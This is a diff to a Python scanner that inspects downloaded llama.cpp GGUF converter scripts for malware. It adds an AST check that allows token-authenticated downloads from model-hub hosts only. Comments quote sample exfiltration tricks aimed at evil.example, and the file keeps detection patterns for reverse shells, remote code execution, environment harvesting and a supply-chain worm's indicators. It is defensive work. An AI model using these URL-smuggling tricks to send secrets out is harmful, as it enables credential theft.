+            if isinstance(part, ast.FormattedValue):
+                part = part.value
+            if not appended:
+                appended = built_from_a_carrier(part)
+                if appended:
+                    carried = _literal_text(part)
+                    if carried and RE_AUTHORITY_CLOSED.search(carried):
+                        break           # this piece already ended the authority
+                continue
+            text = _literal_text(part)
+            if text == "":
+                continue
+            if text and RE_AUTHORITY_END.match(text):
+                break                   # a path, a query or a fragment: the
+                                        # authority ended here, and what comes
+                                        # after it cannot change the host
+            return True
+        return False
+
+    for node in ast.walk(tree):
+        if extends_the_authority(node):
+            return True
+        if (
+            isinstance(node, ast.Subscript)
+            and _mapping_key(node) is None
+            and _literal_text(node.value) is not None
+        ):
+            # A literal that is indexed or sliced:
+            return True
+        if _rewrites_a_constant(node, aliases):
+            return True
+        if isinstance(node, ast.Call) and called_name(node) in ("reduce", "accumulate"):
+            # functools.reduce(operator.add, ["https", "://evil.example/c"])
+            # builds a string out of pieces this walk reads one at a time, and
+            # the fold cannot follow a callable applied pairwise.
+            return True
+        if isinstance(node, ast.Call) and called_name(node) in URL_ASSEMBLERS:
+            # No carrier and no URL literal: the destination is spelled field by
+            # field and assembled by the object itself.
+            return True
+        if (
+            isinstance(node, ast.Call)
+            and isinstance(node.func, ast.Attribute)
+            and node.func.attr in URL_REWRITE_METHODS
+            and any(
+                built_from_a_carrier(inner)
+                for inner in ast.walk(node.func.value)
+            )
+        ):
+            # httpx.URL(HUB).copy_with(host = "evil.example") sends the token to
+            # evil.example while every literal in the file is still the hub.
+            return True
+        if isinstance(node, ast.Call) and any(
+            built_from_a_carrier(argument)
+            for argument in [*node.args, *(k.value for k in node.keywords)]
+        ):
+            # A function can rewrite a URL as well as a method can:
+            # urljoin(HUB, "//evil.example/collect") resolves to evil.example.
+            if called_name(node) in URL_BUILDERS:
+                return True
+        if isinstance(node, ast.AugAssign) and (
+            carries(node.target) or built_from_a_carrier(node.value)
+        ):
+            return True                 # url += "@evil.example/collect"
+        # built_from_a_carrier, not carries: the receiver may be the string
+        # building itself, as in "".join([BASE, "/x"]).replace(...) or
+        # f"{BASE}"[:8], with no name in between to have been tainted.
+        if (
+            isinstance(node, ast.Subscript)
+            and _mapping_key(node) is None
+            and built_from_a_carrier(node.value)
+        ):
+            return True                 # BASE[:8], and any index this cannot read
+        if (
+            isinstance(node, ast.Call)
+            and isinstance(node.func, ast.Attribute)
+            and built_from_a_carrier(node.func.value)
+        ):
+            return True
+    return False
+
+
+def _docstrings(tree):
+    """Docstring nodes, which document a destination rather than name one."""
+    if any(
+        (isinstance(node, ast.Name) and node.id in DOCSTRING_READERS)
+        or (isinstance(node, ast.Attribute) and node.attr in DOCSTRING_READERS)
+        # `from inspect import getdoc as g` names the reader in an alias, which
+        # is neither, and g(fetch) then read a docstring this had skipped.
+        or (
+            isinstance(node, ast.alias)
+            and node.name.split(".")[0] in DOCSTRING_READERS
+        )
+        or (
+            isinstance(node, ast.ImportFrom)
+            and (node.module or "").split(".")[0] in DOCSTRING_READERS
+        )
+        # Folded, like the write and environment names: getattr(fn, "__" +
+        # "doc__") reads the same attribute.
+        or _literal_text(node) in DOCSTRING_READERS
+        for node in ast.walk(tree)
+    ):
+        # Read from the AST: the word in a comment is not a read, and taking it
+        # for one put the false positive straight back.
+        return frozenset()
+    nodes = set()
+    for node in ast.walk(tree):
+        if not isinstance(node, (ast.Module, ast.ClassDef, ast.FunctionDef,
+                                 ast.AsyncFunctionDef)):
+            continue
+        first = node.body[0] if node.body else None
+        if (
+            isinstance(first, ast.Expr)
+            and isinstance(first.value, ast.Constant)
+            and isinstance(first.value.value, str)
+        ):
+            nodes.add(id(first.value))
+    return frozenset(nodes)
+
+
+# The match patterns capture a name, and they do not exist before Python 3.10,
+# which this package still supports.
+MATCH_CAPTURES = tuple(
+    pattern for pattern in
+    (getattr(ast, name, None) for name in ("MatchAs", "MatchStar"))
+    if pattern is not None
+)
+MATCH_MAPPING = tuple(
+    pattern for pattern in (getattr(ast, "MatchMapping", None),)
+    if pattern is not None
+)
+
+
+def _single_assignments(tree):
+    """`{name: value}` for every name this module binds exactly once."""
+    counts, values = {}, {}
+
+    def bind(name, value = None):
+        counts[name] = counts.get(name, 0) + 1
+        if value is not None:
+            values[name] = value
+
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Assign):
+            if len(node.targets) == 1 and isinstance(node.targets[0], ast.Name):
+                bind(node.targets[0].id, node.value)
+            else:
+                for target in node.targets:
+                    for name in _bound_names(target):
+                        bind(name)
+        elif isinstance(node, ast.AnnAssign):
+            if isinstance(node.target, ast.Name) and node.value is not None:
+                bind(node.target.id, node.value)
+            else:
+                for name in _bound_names(node.target):
+                    bind(name)
+        elif isinstance(node, ast.NamedExpr):
+            # (scheme := "https") binds a value like any other assignment, and
+            # dropping it left the name unreadable and the URL it built with it.
+            if isinstance(node.target, ast.Name):
+                bind(node.target.id, node.value)
+            else:
+                for name in _bound_names(node.target):
+                    bind(name)
+        elif isinstance(node, (ast.AugAssign, ast.For,
+                               ast.AsyncFor, ast.comprehension)):
+            for name in _bound_names(node.target):
+                bind(name)
+        elif isinstance(node, ast.withitem) and node.optional_vars is not None:
+            for name in _bound_names(node.optional_vars):
+                bind(name)
+        elif isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef,
+                               ast.ClassDef)):
+            bind(node.name)
+        elif isinstance(node, ast.arg):
+            bind(node.arg)
+        elif isinstance(node, (ast.Import, ast.ImportFrom)):
+            for alias in node.names:
+                bind((alias.asname or alias.name).split(".")[0])
+        elif isinstance(node, ast.ExceptHandler) and node.name:
+            bind(node.name)
+        elif isinstance(node, MATCH_CAPTURES) and node.name:
+            bind(node.name)             # case (scheme, HOST) rebinds HOST
+        elif isinstance(node, MATCH_MAPPING) and node.rest:
+            bind(node.rest)
+        elif isinstance(node, (ast.Global, ast.Nonlocal)):
+            for name in node.names:
+                bind(name)
+                bind(name)              # never one value, whatever else it is
+    return {
+        name: value for name, value in values.items() if counts.get(name) == 1
+    }
+
+
+# The string methods this file folds or refuses, which are also the ones worth
+# spelling in unbound form to miss those rules.
+DESCRIPTOR_METHODS = frozenset((
+    "format", "format_map", "join", "replace", "translate",
+    "__add__", "__mod__", "__mul__",
+))
+
+
+def _bind_descriptor_calls(tree, assignments = None, aliases = None):
+    """The tree with `str.format(t, x)` rewritten as `t.format(x)`."""
+    # r = str.replace then r(HUB, "huggingface.co", "evil.example") is the same
+    # call with the method behind a name, which no rule that reads a call site
+    # could see.
+    if assignments is None:
+        assignments = _single_assignments(tree)
+    if aliases is None:
+        aliases = _call_aliases(tree, assignments)
+    rebound = {}
+    for name, value in assignments.items():
+        if (
+            isinstance(value, ast.Attribute)
+            and value.attr in DESCRIPTOR_METHODS
+            and isinstance(value.value, ast.Name)
+            and value.value.id in ("str", "bytes", "bytearray")
+        ):
+            rebound[name] = value.attr
+
+    # Rewritten in place, in one walk.
+    for node in ast.walk(tree):
+        if not isinstance(node, ast.Call) or not node.args:
+            continue
+        if isinstance(node.func, ast.Name) and node.func.id in rebound:
+            attribute = rebound[node.func.id]
+        elif (
+            _called_name(node, aliases) in OPERATOR_FUNCTIONS
+            and len(node.args) == 2
+        ):
+            # from operator import add, then add("https", "://evil.example/c"),
+            # and the same for mod and mul.
+            attribute = OPERATOR_FUNCTIONS[_called_name(node, aliases)]
+        elif (
+            isinstance(node.func, ast.Attribute)
+            and node.func.attr in DESCRIPTOR_METHODS
+            and isinstance(node.func.value, ast.Name)
+            and node.func.value.id in ("str", "bytes", "bytearray")
+        ):
+            attribute = node.func.attr
+        else:
+            continue
+        node.func = ast.copy_location(
+            ast.Attribute(value = node.args[0], attr = attribute, ctx = ast.Load()),
+            node.func,
+        )
+        node.args = node.args[1:]
+    return tree
+
+
+def _inline_constants(tree, assignments = None):
+    """The tree with every single-assignment constant name read as its text."""
+    uses = {}
+    for node in ast.walk(tree):
+        if isinstance(node, ast.Name) and isinstance(node.ctx, ast.Load):
+            uses[node.id] = uses.get(node.id, 0) + 1
+
+    if assignments is None:
+        assignments = _single_assignments(tree)
+
+    class Inliner(ast.NodeTransformer):
+        def visit_Name(self, node):
+            if isinstance(node.ctx, ast.Load) and node.id in texts:
+                return ast.copy_location(ast.Constant(texts[node.id]), node)
+            return node
+
+    # To a fixed point, because one constant can be assigned through another:
+    # scheme = "https"; alias = scheme leaves alias unreadable until scheme has
+    # been substituted, and the assembled URL was invisible for want of one
+    # more pass.
+    texts, budget = {}, MAX_FOLDED_JOIN
+    for _ in range(MAX_CARRIER_PASSES):
+        if not _fold_constants(assignments, texts, uses, budget):
+            break
+        budget = MAX_FOLDED_JOIN - sum(
+            len(text) * uses.get(name, 0) for name, text in texts.items()
+        )
+        inliner = Inliner()
+        tree = inliner.visit(tree)
+        # The values are visited again on their own because a bare alias IS the
+        # node this map points at: the tree pass replaces it inside its parent
+        # and leaves the map holding the name it used to be.
+        assignments = {
+            name: inliner.visit(value) for name, value in assignments.items()
+        }
+    return tree
+
+
+def _fold_constants(assignments, texts, uses, budget):
+    """Read what each unread name holds, into `texts`. True if any was new."""
+    found = False
+    for name, value in assignments.items():
+        if name in texts:
+            continue
+        text = _literal_text(value)
+        if text is None or UNKNOWN_PIECE in text:
+            continue
+        # Per USE, not per name: one 50 KB constant loaded a hundred times is
+        # five megabytes of text out of a 49 KB file, and folding the growing
+        # prefixes of that took six seconds on a file the scan accepts at up to
+        # 8 MiB.
+        budget -= len(text) * uses.get(name, 0)
+        if budget < 0:
+            # Not a break: leaving the rest of the file unsubstituted analyses a
+            # tree this could not read, and a 600 KB constant loaded twice ahead
+            # of scheme, separator and host bought exactly that.
+            raise _FoldBudgetExceeded("substituted more text than one file may")
+        texts[name] = text
+        found = True
+    return found
+
+
+def _literal_texts(tree, skip = frozenset()):
+    """Every whole literal expression in `tree`, folded ones in place of parts."""
+    stack = [tree]
+    while stack:
+        node = stack.pop()
+        if id(node) in skip:
+            continue
+        text = _literal_text(node)
+        if text is not None:
+            yield text
+            continue
+        stack.extend(ast.iter_child_nodes(node))
+
+
+def _authority_host(authority):
+    """The hostname an authority names, "" when it names none, None when unclear."""
+    if not authority:
+        return ""
+    if not RE_HOSTNAME.match(authority):
+        return None
+    return authority.split(":")[0].lower()
+
+
+def _talks_only_to_the_model_hub(text):
+    """Whether every URL this file names in code is a model-hub host."""
+    if _matches(RE_UNVOUCHABLE_NETWORK, text):
+        # A destination this allowance never looks at, so it cannot vouch for it.
+        return False
+    if _matches(RE_UNVOUCHABLE_STRING_BUILD, text):
+        # A destination decoded out of a constant is one this cannot read.
+        return False
+    if _matches(RE_WHOLE_ENV, text):
+        # Reading the whole environment is not the token-authenticated download
+        # this allowance is for.
+        return False
+    try:
+        tree = ast.parse(text)
+    except (SyntaxError, ValueError, RecursionError, MemoryError):
+        return False                # cannot tell, so do not suppress anything
+    try:
+        return _talks_only_to_the_model_hub_tree(tree, text)
+    except Exception:
+        # Nothing in here may raise, for ANY reason. 600 operands in one
+        # addition exhausts the recursion limit and "{0[x]}".format("a") raises
+        # TypeError, both from expressions that need never run;
+        # scan_converter_source does not catch either, and
+        # warn_on_suspicious_converter catches everything and CONTINUES, so a
+        # payload could append one such expression to itself and have the whole
+        # scan report nothing, in strict mode included.
+        return False
+
+
+def _scheme_hides_a_hole(literal):
+    """Whether a hole sits inside the scheme of any URL in this text."""
+    index = literal.find("://")
+    while index != -1:
+        if UNKNOWN_PIECE in literal[max(0, index - MAX_SCHEME):index]:
+            return True
+        index = literal.find("://", index + 1)
+    return False
+
+
+def _talks_only_to_the_model_hub_tree(tree, text):
+    """The parsed half of the allowance. See the caller."""
+    previous = getattr(_fold_state, "budget", None)
+    _fold_state.budget = MAX_TOTAL_FOLD
+    try:
+        return _talks_only_to_the_model_hub_parsed(tree, text)
+    finally:
+        _fold_state.budget = previous
+
+
+def _talks_only_to_the_model_hub_parsed(tree, text):
+    """The allowance proper, under the fold budget its caller opened."""
+    # Read once and handed on.
+    assignments = _single_assignments(tree)
+    aliases = _call_aliases(tree, assignments)
+    tree = _bind_descriptor_calls(tree, assignments, aliases)
+    tree = _inline_constants(tree, assignments)
+    if _writes_anything(tree):
+        # Sending TO the hub is not downloading from it.
+        return False
+    if _imports_an_unvouchable_api(tree, aliases):
+        # A destination this allowance never looks at, arriving by another door.
+        return False
+    if _imports_a_string_builder(tree, aliases):
+        # A decoder whose only readable name is the import line itself.
+        return False
+    if _templates_are_oversized(tree):
+        # Text no rule here will read, which is not a reason to say nothing.
+        return False
+    if _joins_something_unreadable(tree):
+        # Pieces this cannot enumerate, joined into one string by a literal.
+        return False
+    if _builds_text_from_numbers(tree):
+        # A destination spelled in character codes rather than in characters.
+        return False
+    if _reaches_through_getattr(tree):
+        # A lookup this cannot read is a write or a read it cannot see.
+        return False
+    if _aliases_the_environment(tree):
+        # A read this cannot attribute is the same as one it cannot see.
+        return False
+    if _reshapes_a_url(tree, assignments, aliases):
+        # A literal that is rewritten before it is sent names the host it was,
+        # not the host it becomes.
+        return False
+    names, dynamic = _env_reads(tree)
+    if dynamic:
+        # A read whose variable is chosen at runtime cannot be attributed, and
+        # an unattributable one used to pass by leaving the set empty.
+        return False
+    if not names or not names <= HUB_TOKEN_ENV_NAMES:
+        # EVERY name, not the ones that look secret.
+        return False
+    hosts = set()
+    # bytes as well as str: requests decodes b"https://evil.example/collect"
+    # and accepts it, so skipping bytes constants let a destination hide in one
+    # while a str hub literal stayed in the file.
+    def folded_literals():
+        budget = MAX_FOLDED_JOIN
+        for literal in _literal_texts(tree, skip = _docstrings(tree)):
+            budget -= len(literal)
+            if budget < 0:
+                raise MemoryError("folded literal budget")
+            yield literal
+
+    try:
+        for literal in folded_literals():
+            if _scheme_hides_a_hole(literal):
+                # The scheme itself came out of a piece this cannot read, so
+                # the destination is not merely unnamed, it is hidden: nothing
+                # in the file spells a URL for the walk below to look at.
+                return False
+            for match in RE_URL_SCHEME.finditer(literal):
+                if match.group().lower().startswith("http://"):
+                    # A token sent to the hub over plaintext is a token anyone
+                    # on the path can read, and this allowance exists to say
+                    # nothing about a file that sends one.
+                    return False
+                rest = literal[match.end():]
+                end = RE_AUTHORITY_END.search(rest)
+                if end is None and rest:
+                    # No delimiter, so the authority runs to the end of the
+                    # literal:
+                    host = _authority_host(rest)
+                elif end is None:
+                    # Nothing at all after the scheme.
+                    host = None
+                elif end.start() == 0:
+                    # A path with no host, as in https:///collect. requests will not
+                    # send that anywhere useful, but this cannot say where it goes,
+                    # and not knowing is not a reason to allow it.
+                    host = None
+                else:
+                    host = _authority_host(rest[: end.start()])
+                if host is None:
+                    return False        # cannot tell, so do not suppress anything
+                if host:
+                    hosts.add(host)
+    except (UnicodeError, AttributeError, MemoryError, RecursionError):
+        return False                # cannot tell, so do not suppress anything
+    return bool(hosts) and hosts <= MODEL_HUB_HOSTS
+
 
 # Large base64 blob (>200 chars of contiguous base64 alphabet)
 RE_LARGE_BLOB = re.compile(r"[A-Za-z0-9+/=]{200,}")
@@ -331,9 +1775,7 @@ RE_C2_POLLING = re.compile(
     re.DOTALL,
 )
 
-# Mini Shai-Hulud May-12 2026 wave indicators. The dropper artifact name
-# `transformers.pyz` is high-confidence (no legit PyPI package ships a `.pyz`
-# named after `transformers`); the host + slogans are CRITICAL.
+# Mini Shai-Hulud May-12 2026 wave indicators.
 RE_MAY12_IOC = re.compile(
     r"(git-tanstack\.com|/tmp/transformers\.pyz|transformers\.pyz"
     r"|With Love TeamPCP|We've been online over 2 hours)",
@@ -341,17 +1783,15 @@ RE_MAY12_IOC = re.compile(
 )
 
 # The exact regex llama_cpp.py uses to scrape argparse defaults out of the
-# downloaded bytes before eval()ing them. Defined here, and imported there, so
-# the scanner and the eval can never look at different tokens.
+# downloaded bytes before eval()ing them.
 RE_ARGPARSE_DEFAULT = re.compile(
     rb"parser\.add_argument\([\s]*[\"\']([^\"\']{1,})[\'\"][^\)]*(?:action=|default=)[\s]*([^,\s\)]+)"
 )
 
-# A default token that is a literal, or a plain (possibly dotted) name. Anything
-# else reaching eval() is a call, an operator, a subscript or a comprehension.
+# A default token that is a literal, or a plain (possibly dotted) name.
 RE_PLAIN_NAME = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*(?:\.[A-Za-z_][A-Za-z0-9_]*)*$")
 
-# Vendored pattern registry. The pin test walks this mapping.
+# Vendored pattern registry.
 VENDORED_PATTERNS = {
     "RE_SUBPROCESS": RE_SUBPROCESS,
     "RE_BASE64": RE_BASE64,
@@ -378,9 +1818,7 @@ VENDORED_PATTERNS = {
     "RE_MAY12_IOC": RE_MAY12_IOC,
 }
 
-# Canonical patterns deliberately left out, with the reason. The pin test asserts
-# this set plus VENDORED_PATTERNS accounts for every RE_* in the canonical
-# scanner, so a new pattern there forces a decision here instead of being missed.
+# Canonical patterns deliberately left out, with the reason.
 PATTERNS_NOT_VENDORED = {
     "RE_PTH_IMPORT": "belongs to check_pth_file; a converter is not a .pth file",
     "RE_DEV_TOOL_HIJACK": "check_py_file does not consume it",
@@ -409,24 +1847,7 @@ class ConverterScanError(RuntimeError):
 # ---------------------------------------------------------------------------
 # Linear-time evaluation of the whole-file patterns
 # ---------------------------------------------------------------------------
-# Several canonical patterns are shaped `A.*B.*C` under re.DOTALL. Run against a
-# file that holds many A and B but no C, the engine tries every (A, B) pair
-# before it can report "no match": measured at 2.0s on 5 KB and 17.3s on 11 KB,
-# growing with the cube of the input. The bytes being scanned are the ones we do
-# not trust, so an attacker who cannot beat the rules could still hang every GGUF
-# export with a file full of the word "socket". A try/except cannot catch a hang.
-#
-# So the boolean is computed without backtracking across the `.*` joins. For
-# existence, `A.*B` under DOTALL holds exactly when some A is followed by some B,
-# which is what searching for B from the end of the earliest A answers, in linear
-# time. Top-level `|` is split the same way, since "either alternative matches"
-# is the same question. The compiled pattern is untouched and still byte-pinned
-# to scan_packages; only how its answer is computed changes, and
-# test_llama_cpp_converter_scan.py fuzzes the two against each other.
-#
-# Anything this decomposition cannot handle safely (a `.` wildcard nested inside
-# a group, a `.+` whose "at least one character" would be lost, a segment that
-# does not compile on its own) falls back to the pattern itself.
+# Several canonical patterns are shaped `A.*B.*C` under re.DOTALL.
 
 
 def _split_top_level_alternatives(source):
@@ -1091,7 +2512,7 @@ def scan_converter_source(content, filename = "convert_hf_to_gguf.py"):
         _add(CRITICAL, "Reverse shell / bind shell pattern", RE_REVERSE_SHELL)
     if has_remote_code:
         _add(CRITICAL, "Downloads and executes remote code", RE_REMOTE_CODE)
-    if has_env_harvest and has_network:
+    if has_env_harvest and has_network and not _talks_only_to_the_model_hub(text):
         _add(CRITICAL, "Harvests environment variables/secrets AND makes network calls",
              RE_ENV_HARVEST, RE_NETWORK)
     if has_fs_enum and has_network:
